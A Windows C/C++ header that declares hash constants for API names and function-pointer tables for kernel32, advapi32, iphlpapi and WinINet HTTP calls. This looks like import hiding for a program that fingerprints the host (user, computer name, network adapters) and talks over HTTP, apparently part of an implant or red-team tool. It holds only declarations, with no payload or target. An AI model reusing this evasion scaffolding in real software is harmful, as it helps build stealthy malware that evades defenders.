#pragma once
#include <Windows.h>
#include <wininet.h>
#include <iphlpapi.h>

#define DECL(x) decltype(x) * x;

#define HASHED_GetUserNameA		   0xe7cb70d1
#define HASHED_LoadLibraryA        0x8e338329
#define HASHED_GetModuleFileNameA  0xd716f83d
#define HASHED_GetComputerNameExA  0xcf275e49
#define HASHED_HeapAlloc           0x1c67db00
#define HASHED_HeapFree            0x4bdcb69a
#define HASHED_GetAdaptersInfo     0xe0b877eb

struct MODULES {
	HMODULE K32;
	HMODULE IPHLPAPI;
	HMODULE WININET;
	HMODULE NTDLL;
	HMODULE ADVAPI32;
};

struct WINAPIS {

	// kernel32
	DECL(ReadFile);
	DECL(GetModuleFileNameA);
	DECL(GetComputerNameExA);
	DECL(LoadLibraryA);
	DECL(HeapAlloc);


	//advapi
	DECL(GetUserNameA);

	//Iphlpapi
	DECL(GetAdaptersInfo);


};

struct HTTPAPIS {
	DECL(InternetOpenA);
	DECL(InternetConnectA);
	DECL(HttpOpenRequestA);
	DECL(HttpSendRequestA);
	DECL(InternetReadFile);
	DECL(InternetCloseHandle);
	DECL(HttpAddRequestHeadersA)
};


extern WINAPIS * WinApis;
extern HTTPAPIS* HttpApis;
extern MODULES* kModules;

BOOL LoadAPIS();
DWORD Hasher(const char* str);
